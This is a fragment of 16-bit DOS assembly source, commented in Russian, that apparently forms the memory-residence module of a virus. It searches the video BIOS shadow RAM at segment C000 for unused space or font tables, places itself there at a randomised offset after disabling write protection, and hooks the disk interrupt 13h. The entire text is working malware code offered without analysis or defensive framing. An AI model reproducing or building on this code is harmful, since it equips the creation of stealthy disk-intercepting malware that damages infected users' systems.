
                ; tsr с использованием shadowram

rnd_size        equ     66
scan_size       equ     tsr_size + rnd_size  ; сколько нам памяти нужно

                ; <ds=cs>
                ; <DF=0>

                ; output: ZF

tsr_sh:         push    ds es

                mve     ds, cs

                CLI
                cld

                call    save_sh_state

                mov     al, state_F000  ; FF
                inc     al
                jz      @@exit

                call    find_real_13
                jne     @@exit

                call    scan_C000
                je      @@ok

                IF      SCAN_SIZE LE 14*256

                call    scan_8x14_1
                je      @@ok

                call    scan_8x14_2
                je      @@ok

                ENDIF

                ; ZF=0
                ret

@@ok:           ; сейчас имеем: ES:BP=куда покласться

                call    disable_sh

                mov     ax, rnd_size
                call    rnd
                add     bp, ax

                add     bp, 15
                and     bp, not 15
                shr     bp, 4
                mov     ax, es
                add     ax, bp
                sub     ax, 16
                mov     es, ax
                lea     di, start

                mov     EA, 0EAh
                mov     EA.w1, offset int_13_sh
                mov     EA.w3, es

                mov     my_seg, es

                lea     si, start
                mov     cx, tsr_size
                rep     movsb

                call    switch_13

                call    rest_sh_state

                xor     ax, ax ; CF=0  ZF=1

@@exit:         pop     es ds
                ret

scan_C000:      mve     es, 0C000h      ; C000:0000
                xor     di, di

                xor     dl, dl          ; dx = bios size in WORDs
                mov     dh, es:[di+2]

                shl     dx, 1           ; in BYTEs

                jnc     @@1             ; max 64k
                mov     dh, 80h

@@1:            sub     dx, scan_size + 32

                xor     ax, ax

@@2:            mov     bp, di

                mov     cx, (scan_size + 1) / 2
                repe    scasw
                je      @@exit

                cmp     di, dx
                jbe     @@2

@@exit:         ret


                IF      SCAN_SIZE LE 14*256

scan_8x14_1:    mov     ax, 1130h
                mov     bh, 2           ; 8x14
                int     10h

                mov     ax, es
                cmp     ax, 0c000h

                ret

scan_8x14_2:    mve     es, 0c000h
                xor     di, di

@@2:            mov     cx, 14
                xor     al, al
                repe    scasb
                jnz     @@1

                mov     cx, 16
                repe    scasb

                cmp     es:[di-1].w0, 1000000101111110b
                jne     @@1
                cmp     es:[di-1+14].w0, 1111111101111110b
                je      @@3

@@1:            cmp     di, 0f000h
                jbe     @@2

@@3:            mov     bp, di

                ret

                ENDIF

